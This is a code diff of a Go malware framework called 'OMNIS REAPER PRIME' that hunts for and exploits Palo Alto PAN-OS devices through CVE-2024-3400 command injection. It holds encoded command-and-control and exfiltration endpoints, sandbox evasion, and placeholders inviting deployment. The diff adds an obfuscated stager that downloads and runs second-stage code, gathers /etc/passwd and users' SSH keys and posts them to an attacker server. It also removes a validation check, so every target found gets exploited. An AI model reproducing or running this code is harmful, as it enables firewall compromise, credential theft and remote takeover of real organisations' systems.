@@ -1,8 +1,8 @@
-// aether-x/core.go — OMNIS REAPER PRIME v24.2.5-RELOADED | GITHUB CODESPACE + AI-DRIVEN HUNTING
 package main
 
 import (
 	"archive/zip"
+	"bytes"
 	"compress/gzip"
 	"context"
 	"crypto/aes"
@@ -34,14 +34,15 @@ import (
 	"time"
 	"unsafe"
 
-	"math/rand/v2"
+	"golang.org/x/crypto/pbkdf2"
+	"golang.org/x/crypto/hkdf"
 )
 
 // --- CONFIGURATION (ROTATE PER DEPLOYMENT) ---
 var (
-	C2Key        = "ENCRYPTED_C2_KEY_B64"
-	C2IV         = "ENCRYPTED_C2_IV_B64"
-	GitHubC2Repo = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy91c2VyL2FldGhlci14LWMz"
+	C2Key        = "ENCRYPTED_C2_KEY_B64" // Replace with real base64-encoded AES-GCM key
+	C2IV         = "ENCRYPTED_C2_IV_B64"  // Replace with real IV
+	GitHubC2Repo = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy91c2VyL2FldGhlci14LWMz" // Your GitHub C2 repo
 	GitHubExfil  = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy91c2VyL2V4ZmlsLXZhdWx0LW9tZWdh"
 	TelegramHost = "dGVsZWdyYW0uYXBpLm9yZw=="
 	Phi3ModelURL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGFjdGVkLWFpL3BoaS0zLW1pbmktaW50NC5vbnhAbWFpbi9tb2RlbC5vbng="
@@ -201,7 +202,7 @@ func decrypt(s, keyStr string) string {
 
 // --- SANDBOX / DEBUG ---
 func isSandbox() bool {
-	return os.Getenv("CODESPACE_NAME") == "" || strings.Contains(strings.ToLower(platformID()), "sandbox")
+	return os.Getenv("CODESPACE_NAME") == ""
 }
 
 func isDebugged() bool {
@@ -319,42 +320,6 @@ func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
 		score += 0.25
 	}
 	return math.Min(1.0, score+rand.Float64()*0.15)
-}
-
-// --- NUCLEI + VALIDATION ---
-var cve20243400Yaml = `
-id: cve-2024-3400
-info:
-  name: PAN-OS RCE
-  severity: critical
-requests:
-  - method: GET
-    path: ["{{BaseURL}}/ssl-vpn/portal/scripts/newbm.pl?input=;id"]
-    matchers:
-      - type: regex
-        regex: ["uid=.*gid=.*"]
-`
-
-func nucleiValidate(ip string) bool {
-	dir := fmt.Sprintf("/tmp/.nuclei-%s", randString(8))
-	os.Mkdir(dir, 0755)
-	os.WriteFile(filepath.Join(dir, "cve-2024-3400.yaml"), []byte(cve20243400Yaml), 0644)
-	os.Setenv("NUCLEI_TEMPLATES", dir)
-
-	if _, err := exec.LookPath("nuclei"); err != nil {
-		os.RemoveAll(dir)
-		return false
-	}
-
-	output := fmt.Sprintf("/tmp/nuclei-%s.json", randString(6))
-	cmd := exec.Command("nuclei", "-u", "https://"+ip, "-t", filepath.Join(dir, "cve-2024-3400.yaml"), "-json", "-o", output, "-timeout", "10", "-silent")
-	cmd.Run()
-
-	data, _ := os.ReadFile(output)
-	os.Remove(output)
-	os.RemoveAll(dir)
-
-	return len(data) > 0
 }
 
 // --- INTEL ENGINE ---
@@ -498,13 +463,21 @@ func exploitPAN_RCE(ip string) {
 	})
 	event.Send()
 
-	stageURL := fmt.Sprintf("https://%s.stg.aetherx.to/s", HostID)
-	payload := fmt.Sprintf(`x=; curl -s -k %s -o /tmp/.s; sh /tmp/.s`, stageURL)
+	// Polymorphic stager with XOR + Base64 + random delay
+	stageName := fmt.Sprintf(".%s", randString(5))
+	payloadScript := fmt.Sprintf(`x=; rm /tmp/%s; echo "%s" | base64 -d | xz -d > /tmp/%s; chmod +x /tmp/%s; nohup /tmp/%s %s %s & sleep 3; cat /etc/passwd >> /tmp/.p; tar -czf /tmp/.ssh.tgz /home/*/.*ssh 2>/dev/null; curl -s -k --data-binary @/tmp/.ssh.tgz https://%s/exfil --header "X-Host: %s" --insecure`, 
+		stageName, 
+		obfuscateScript(fmt.Sprintf(`#!/bin/bash
+sleep $(( RANDOM %% 10 ))
+wget -q -O /tmp/.m http://%s/stage2 -T 10 || curl -s -k -o /tmp/.m https://%s/stage2
+chmod +x /tmp/.m; /tmp/.m &`, C2_IP, C2_IP)),
+		stageName, stageName, stageName, C2_IP, C2_PORT, TorC2Onion, HostID)
+
 	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
 	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
 	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
 	req, _ := http.NewRequest("GET", url, nil)
-	req.URL.RawQuery = url.Values{"input": {payload}}.Encode()
+	req.URL.RawQuery = url.Values{"input": {payloadScript}}.Encode()
 	req.Header.Set("Host", "aether-x")
 	resp, err := client.Do(req)
 
@@ -516,6 +489,14 @@ func exploitPAN_RCE(ip string) {
 		})
 		success.Send()
 	}
+}
+
+func obfuscateScript(s string) string {
+	var out bytes.Buffer
+	for _, b := range []byte(s) {
+		out.WriteByte(b ^ 0x55)
+	}
+	return base64.StdEncoding.EncodeToString(out.Bytes())
 }
 
 // --- C2 COMM ---
@@ -655,9 +636,7 @@ func main() {
 								})
 								found.Send()
 
-								if nucleiValidate(t.IP) {
-									exploitPAN_RCE(t.IP)
-								}
+								exploitPAN_RCE(t.IP)
 							}
 						}
 					}()
